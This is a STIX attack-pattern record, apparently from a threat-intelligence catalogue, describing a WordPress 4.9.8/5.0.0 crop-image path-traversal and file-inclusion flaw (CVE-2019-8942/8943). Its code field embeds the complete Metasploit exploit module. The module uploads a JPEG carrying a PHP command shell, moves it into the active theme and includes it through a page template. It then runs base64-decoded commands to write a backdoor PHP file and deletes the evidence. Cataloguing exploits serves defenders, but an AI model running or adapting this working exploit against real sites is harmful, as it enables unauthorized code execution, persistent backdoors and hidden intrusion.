{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a3679645-4edf-4f1b-89c1-ad63e6e9da69",
    "created": "2024-08-14T17:09:15.15661Z",
    "modified": "2024-08-14T17:09:15.156614Z",
    "name": "WordPress Crop-image Shell Upload",
    "description": " This module exploits a path traversal and a local file inclusion vulnerability on WordPress versions 5.0.0 and <= 4.9.8. The crop-image function allows a user, with at least author privileges to resize an image and perform a path traversal by changing the _wp_attached_file reference during the upload. The second part of the exploit will include this image in the current theme by changing the _wp_page_template attribute when creating a post.  This exploit module only works for Unix-based systems currently.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wp_crop_rce.rb",
            "external_id": "wp_crop_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-8942"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-8943"
        },
        {
            "source_name": "reference",
            "url": "https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'WordPress Crop-image Shell Upload',\n      'Description'     => %q{\n          This module exploits a path traversal and a local file inclusion\n          vulnerability on WordPress versions 5.0.0 and <= 4.9.8.\n          The crop-image function allows a user, with at least author privileges,\n          to resize an image and perform a path traversal by changing the _wp_attached_file\n          reference during the upload. The second part of the exploit will include\n          this image in the current theme by changing the _wp_page_template attribute\n          when creating a post.\n\n          This exploit module only works for Unix-based systems currently.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n      [\n        'RIPSTECH Technology',                               # Discovery\n        'Wilfried Becard <wilfried.becard@synacktiv.com>'    # Metasploit module\n      ],\n    'References'      =>\n      [\n        [ 'CVE', '2019-8942' ],\n        [ 'CVE', '2019-8943' ],\n        [ 'URL', 'https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/']\n      ],\n      'DisclosureDate'  => '2019-02-19',\n      'Platform'        => 'php',\n      'Arch'            => ARCH_PHP,\n      'Targets'         => [['WordPress', {}]],\n      'DefaultTarget'   => 0,\n      'Notes'           =>\n      {\n        'Stability' => [ CRASH_SAFE ],\n        'Reliability' => [ REPEATABLE_SESSION ],\n        'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]\n      }\n    ))\n\n    register_options(\n      [\n        OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),\n        OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with']),\n        OptString.new('THEME_DIR', [false, 'The WordPress theme dir name (disable theme auto-detection if provided)'])\n      ])\n  end\n\n  def check\n    cookie = wordpress_login(username, password)\n    if cookie.nil?\n      store_valid_credential(user: username, private: password, proof: cookie)\n      return CheckCode::Safe\n    end\n\n    CheckCode::Appears\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def get_wpnonce(cookie)\n    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'media-new.php')\n    res = send_request_cgi(\n      'method'    => 'GET',\n      'uri'       => uri,\n      'cookie' => cookie\n    )\n    if res && res.code == 200 && res.body && !res.body.empty?\n      res.get_hidden_inputs.first[\"_wpnonce\"]\n    end\n  end\n\n  def get_wpnonce2(image_id, cookie)\n    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')\n    res = send_request_cgi(\n      'method'    => 'GET',\n      'uri'       => uri,\n      'cookie'    => cookie,\n      'vars_get'  => {\n        'post'   => image_id,\n        'action' => \"edit\"\n      }\n    )\n    if res && res.code == 200 && res.body && !res.body.empty?\n      tmp = res.get_hidden_inputs\n      wpnonce2 = tmp[1].first[1]\n    end\n  end\n\n  def get_current_theme\n    uri = normalize_uri(datastore['TARGETURI'])\n    res = send_request_cgi!(\n      'method'    => 'GET',\n      'uri'       => uri\n    )\n    fail_with(Failure::NotFound, 'Failed to access Wordpress page to retrieve theme.') unless res && res.code == 200 && res.body && !res.body.empty?\n\n    theme = res.body.scan(/\\/wp-content\\/themes\\/(\\w+)\\//).flatten.first\n    fail_with(Failure::NotFound, 'Failed to retrieve theme') unless theme\n\n    theme\n  end\n\n  def get_ajaxnonce(cookie)\n    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => uri,\n      'cookie' => cookie,\n      'vars_post'  => {\n        'action' => 'query-attachments',\n        'post_id' => '0',\n        'query[item]' => '43',\n        'query[orderby]' => 'date',\n        'query[order]' => 'DESC',\n        'query[posts_per_page]' => '40',\n        'query[paged]' => '1'\n      }\n    )\n    fail_with(Failure::NotFound, 'Unable to reach page to retrieve the ajax nonce') unless res && res.code == 200 && res.body && !res.body.empty?\n    a_nonce = res.body.scan(/\"edit\":\"(\\w+)\"/).flatten.first\n    fail_with(Failure::NotFound, 'Unable to retrieve the ajax nonce') unless a_nonce\n\n    a_nonce\n  end\n\n  def upload_file(img_name, wp_nonce, cookie)\n    img_data = %w[\n      FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 60 00 60 00 00 FF ED 00 38 50 68 6F\n      74 6F 73 68 6F 70 20 33 2E 30 00 38 42 49 4D 04 04 00 00 00 00 00 1C 1C 02 74 00\n      10 3C 3F 3D 60 24 5F 47 45 54 5B 30 5D 60 3B 3F 3E 1C 02 00 00 02 00 04 FF FE 00\n      3B 43 52 45 41 54 4F 52 3A 20 67 64 2D 6A 70 65 67 20 76 31 2E 30 20 28 75 73 69\n      6E 67 20 49 4A 47 20 4A 50 45 47 20 76 38 30 29 2C 20 71 75 61 6C 69 74 79 20 3D\n      20 38 32 0A FF DB 00 43 00 06 04 04 05 04 04 06 05 05 05 06 06 06 07 09 0E 09 09\n      08 08 09 12 0D 0D 0A 0E 15 12 16 16 15 12 14 14 17 1A 21 1C 17 18 1F 19 14 14 1D\n      27 1D 1F 22 23 25 25 25 16 1C 29 2C 28 24 2B 21 24 25 24 FF DB 00 43 01 06 06 06\n      09 08 09 11 09 09 11 24 18 14 18 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24\n      24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24\n      24 24 24 24 24 24 24 FF C0 00 11 08 00 C0 01 06 03 01 22 00 02 11 01 03 11 01 FF\n      C4 00 1F 00 00 01 05 01 01 01 01 01 01 00 00 00 00 00 00 00 00 01 02 03 04 05 06\n      07 08 09 0A 0B FF C4 00 B5 10 00 02 01 03 03 02 04 03 05 05 04 04 00 00 01 7D 01\n      02 03 00 04 11 05 12 21 31 41 06 13 51 61 07 22 71 14 32 81 91 A1 08 23 42 B1 C1\n      15 52 D1 F0 24 33 62 72 82 09 0A 16 17 18 19 1A 25 26 27 28 29 2A 34 35 36 37 38\n      39 3A 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 6A 73\n      74 75 76 77 78 79 7A 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 9A A2 A3 A4\n      A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2 D3 D4\n      D5 D6 D7 D8 D9 DA E1 E2 E3 E4 E5 E6 E7 E8 E9 EA F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FF\n      C4 00 1F 01 00 03 01 01 01 01 01 01 01 01 01 00 00 00 00 00 00 01 02 03 04 05 06\n      07 08 09 0A 0B FF C4 00 B5 11 00 02 01 02 04 04 03 04 07 05 04 04 00 01 02 77 00\n      01 02 03 11 04 05 21 31 06 12 41 51 07 61 71 13 22 32 81 08 14 42 91 A1 B1 C1 09\n      23 33 52 F0 15 62 72 D1 0A 16 24 34 E1 25 F1 17 18 19 1A 26 27 28 29 2A 35 36 37\n      38 39 3A 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 6A\n      73 74 75 76 77 78 79 7A 82 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 9A A2\n      A3 A4 A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2\n      D3 D4 D5 D6 D7 D8 D9 DA E2 E3 E4 E5 E6 E7 E8 E9 EA F2 F3 F4 F5 F6 F7 F8 F9 FA FF\n      DA 00 0C 03 01 00 02 11 03 11 00 3F 00 3C 3F 3D 60 24 5F 47 45 54 5B 30 5D 60 3B\n      3F 3E\n    ]\n    img_data = [img_data.join].pack('H*')\n    img_name += '.jpg'\n\n    boundary = \"#{rand_text_alphanumeric(rand(10) + 5)}\"\n    post_data = \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"name\\\"\\r\\n\"\n    post_data << \"\\r\\n#{img_name}\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"action\\\"\\r\\n\"\n    post_data << \"\\r\\nupload-attachment\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"_wpnonce\\\"\\r\\n\"\n    post_data << \"\\r\\n#{wp_nonce}\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"async-upload\\\"; filename=\\\"#{img_name}\\\"\\r\\n\"\n    post_data << \"Content-Type: image/jpeg\\r\\n\"\n    post_data << \"\\r\\n#{img_data}\\r\\n\"\n    post_data << \"--#{boundary}--\\r\\n\"\n    print_status(\"Uploading payload\")\n    upload_uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'async-upload.php')\n\n    res = send_request_cgi(\n      'method'   => 'POST',\n      'uri'      => upload_uri,\n      'ctype'    => \"multipart/form-data; boundary=#{boundary}\",\n      'data'     => post_data,\n      'cookie'   => cookie\n    )\n    fail_with(Failure::UnexpectedReply, 'Unable to upload image') unless res && res.code == 200 && res.body && !res.body.empty?\n    print_good(\"Image uploaded\")\n    res = JSON.parse(res.body)\n    image_id = res[\"data\"][\"id\"]\n    update_nonce = res[\"data\"][\"nonces\"][\"update\"]\n    filename = res[\"data\"][\"filename\"]\n    return filename, image_id, update_nonce\n  end\n\n  def image_editor(img_name, ajax_nonce, image_id, cookie)\n    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => uri,\n      'cookie' => cookie,\n      'vars_post'  => {\n        'action' => 'image-editor',\n        '_ajax_nonce' => ajax_nonce,\n        'postid' => image_id,\n        'history' => '[{\"c\":{\"x\":0,\"y\":0,\"w\":400,\"h\":300}}]',\n        'target' => 'all',\n        'context' => '',\n        'do' => 'save'\n      }\n    )\n    fail_with(Failure::NotFound, 'Unable to access page to retrieve filename') unless res && res.code == 200 && res.body && !res.body.empty?\n    filename = res.body.scan(/(#{img_name}-\\S+)-/).flatten.first\n    fail_with(Failure::NotFound, 'Unable to retrieve file name') unless filename\n\n    filename << '.jpg'\n  end\n\n  def change_path(wpnonce2, image_id, filename, current_date, path, cookie)\n    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')\n    res = send_request_cgi(\n      'method'   => 'POST',\n      'uri'      => uri,\n      'cookie' => cookie,\n      'vars_post'  => {\n        '_wpnonce' => wpnonce2,\n        'action' => 'editpost',\n        'post_ID' => image_id,\n        'meta_input[_wp_attached_file]' => \"#{current_date}#{filename}#{path}\"\n      }\n    )\n  end\n\n  def crop_image(image_id, ajax_nonce, cookie)\n    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')\n    res = send_request_cgi(\n      'method'   => 'POST',\n      'uri'      => uri,\n      'cookie' => cookie,\n      'vars_post'  => {\n        'action' => 'crop-image',\n        '_ajax_nonce' => ajax_nonce,\n        'id' => image_id,\n        'cropDetails[x1]' => 0,\n        'cropDetails[y1]' => 0,\n        'cropDetails[width]' => 400,\n        'cropDetails[height]' => 300,\n        'cropDetails[dst_width]' => 400,\n        'cropDetails[dst_height]' => 300\n      }\n    )\n  end\n\n  def include_theme(shell_name, cookie)\n    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post-new.php')\n    res = send_request_cgi(\n      'method'   => 'POST',\n      'uri'      => uri,\n      'cookie' => cookie\n    )\n    if res && res.code == 200 && res.body && !res.body.empty?\n      wpnonce2 = res.body.scan(/name=\"_wpnonce\" value=\"(\\w+)\"/).flatten.first\n      post_id = res.body.scan(/\"post\":{\"id\":(\\w+),/).flatten.first\n      fail_with(Failure::NotFound, 'Unable to retrieve the second wpnonce and the post id') unless wpnonce2 && post_id\n\n      post_title = Rex::Text.rand_text_alpha(10)\n      uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')\n      res = send_request_cgi(\n        'method'   => 'POST',\n        'uri'      => uri,\n        'cookie' => cookie,\n        'vars_post'  => {\n          '_wpnonce'=> wpnonce2,\n          'action' => 'editpost',\n          'post_ID' => post_id,\n          'post_title' => post_title,\n          'post_name' => post_title,\n          'meta_input[_wp_page_template]' => \"cropped-#{shell_name}.jpg\"\n        }\n      )\n      fail_with(Failure::NotFound, 'Failed to retrieve post id') unless res && res.code == 302\n      post_id\n    end\n  end\n\n  def check_for_base64(cookie, post_id)\n    uri = normalize_uri(datastore['TARGETURI'])\n    # Test if base64 is on target\n    test_string = 'YmFzZTY0c3BvdHRlZAo='\n    res = send_request_cgi!(\n      'method'   => 'GET',\n      'uri'      => uri,\n      'cookie' => cookie,\n      'vars_get' => {\n        'p' => post_id,\n        '0' => \"echo #{test_string} | base64 -d\"\n      }\n    )\n    fail_with(Failure::NotFound, 'Unable to retrieve response to base64 command') unless res && res.code == 200 && !res.body.empty?\n\n    fail_with(Failure::NotFound, \"Can't find base64 decode on target\") unless res.body.include?(\"base64spotted\")\n    # Execute payload with base64 decode\n    @backdoor = Rex::Text.rand_text_alpha(10)\n    encoded = Rex::Text.encode_base64(payload.encoded)\n    res = send_request_cgi!(\n      'method'   => 'GET',\n      'uri'      => uri,\n      'cookie' => cookie,\n      'vars_get' => {\n        'p' => post_id,\n        '0' => \"echo #{encoded} | base64 -d > #{@backdoor}.php\"\n      }\n    )\n\n    fail_with(Failure::NotFound, 'Failed to send payload to target') unless res && res.code == 200 && !res.body.empty?\n    send_request_cgi(\n      'method'  =>  'GET',\n      'uri'     =>  normalize_uri(datastore['TARGETURI'], \"#{@backdoor}.php\"),\n      'cookie'  =>  cookie\n    )\n  end\n\n  def wp_cleanup(shell_name, post_id, cookie)\n    print_status('Attempting to clean up files...')\n    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => uri,\n      'cookie'    => cookie,\n      'vars_post'  => { 'action' => \"query-attachments\" }\n    )\n\n    fail_with(Failure::NotFound, 'Failed to receive a response for uploaded file') unless res && res.code == 200 && !res.body.empty?\n    infos = res.body.scan(/id\":(\\d+),.*filename\":\"cropped-#{shell_name}\".*?\"delete\":\"(\\w+)\".*\"id\":(\\d+),.*filename\":\"cropped-x\".*?\"delete\":\"(\\w+)\".*\"id\":(\\d+),.*filename\":\"#{shell_name}\".*?\"delete\":\"(\\w+)\"/).flatten\n    id1, id2, id3 = infos[0], infos[2], infos[4]\n    delete_nonce1, delete_nonce2, delete_nonce3 = infos[1], infos[3], infos[5]\n    for i in (0...6).step(2)\n      res = send_request_cgi(\n        'method'    => 'POST',\n        'uri'       => uri,\n        'cookie'    => cookie,\n        'vars_post'  => {\n            'action' => \"delete-post\",\n            'id'     => infos[i],\n            '_wpnonce' => infos[i+1]\n        }\n      )\n    end\n\n    uri1 = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'edit.php')\n    res = send_request_cgi(\n      'method'    => 'GET',\n      'uri'       => uri1,\n      'cookie'    => cookie\n    )\n\n    if res && res.code == 200 && res.body && !res.body.empty?\n      post_nonce = res.body.scan(/post=#{post_id}&amp;action=trash&amp;_wpnonce=(\\w+)/).flatten.first\n      fail_with(Failure::NotFound, 'Unable to retrieve post nonce') unless post_nonce\n      uri2 = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')\n\n      res = send_request_cgi(\n        'method'    => 'GET',\n        'uri'       => uri2,\n        'cookie'    => cookie,\n        'vars_get'  => {\n          'post'     => post_id,\n          'action'   => 'trash',\n          '_wpnonce' => post_nonce\n        }\n      )\n\n      fail_with(Failure::NotFound, 'Unable to retrieve response') unless res && res.code == 302\n      res = send_request_cgi(\n        'method'    => 'GET',\n        'uri'       => uri1,\n        'cookie'    => cookie,\n        'vars_get'  => {\n          'post_status' => \"trash\",\n          'post_type'   => 'post',\n          '_wpnonce' => post_nonce\n        }\n      )\n\n      if res && res.code == 200 && res.body && !res.body.empty?\n        nonce = res.body.scan(/post=#{post_id}&amp;action=delete&amp;_wpnonce=(\\w+)/).flatten.first\n        fail_with(Failure::NotFound, 'Unable to retrieve nonce') unless nonce\n\n        send_request_cgi(\n          'method'    => 'GET',\n          'uri'       => uri2,\n          'cookie'    => cookie,\n          'vars_get'  => {\n            'post'     => post_id,\n            'action'   => 'delete',\n            '_wpnonce' => nonce\n          }\n        )\n      end\n    end\n  end\n\n  def exploit\n    fail_with(Failure::NotFound, 'The target does not appear to be using WordPress') unless wordpress_and_online?\n\n    print_status(\"Authenticating with WordPress using #{username}:#{password}...\")\n    cookie = wordpress_login(username, password)\n    fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress') if cookie.nil?\n    print_good(\"Authenticated with WordPress\")\n    store_valid_credential(user: username, private: password, proof: cookie)\n\n    print_status(\"Preparing payload...\")\n    @current_theme = (datastore['THEME_DIR'].blank? ? get_current_theme : datastore['THEME_DIR'])\n    wp_nonce = get_wpnonce(cookie)\n    @current_date = Time.now.strftime(\"%Y/%m/\")\n\n    img_name = Rex::Text.rand_text_alpha(10)\n    @filename1, image_id, update_nonce = upload_file(img_name, wp_nonce, cookie)\n    ajax_nonce = get_ajaxnonce(cookie)\n\n    @filename1 = image_editor(img_name, ajax_nonce, image_id, cookie)\n    wpnonce2 = get_wpnonce2(image_id, cookie)\n\n    change_path(wpnonce2, image_id, @filename1, @current_date, '?/x', cookie)\n    crop_image(image_id, ajax_nonce, cookie)\n\n    @shell_name = Rex::Text.rand_text_alpha(10)\n    change_path(wpnonce2, image_id, @filename1, @current_date, \"?/../../../../themes/#{@current_theme}/#{@shell_name}\", cookie)\n    crop_image(image_id, ajax_nonce, cookie)\n\n    print_status(\"Including into theme\")\n    post_id = include_theme(@shell_name, cookie)\n\n    check_for_base64(cookie, post_id)\n    wp_cleanup(@shell_name, post_id, cookie)\n  end\n\n  def on_new_session(client)\n    client.shell_command_token(\"rm wp-content/uploads/#{@current_date}#{@filename1[0...10]}*\")\n    client.shell_command_token(\"rm wp-content/uploads/#{@current_date}cropped-#{@filename1[0...10]}*\")\n    client.shell_command_token(\"rm -r wp-content/uploads/#{@current_date}#{@filename1[0...10]}*\")\n    client.shell_command_token(\"rm wp-content/themes/#{@current_theme}/cropped-#{@shell_name}.jpg\")\n    client.shell_command_token(\"rm #{@backdoor}.php\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-02-19",
    "x_mitre_platforms": [
        "php'"
    ]
}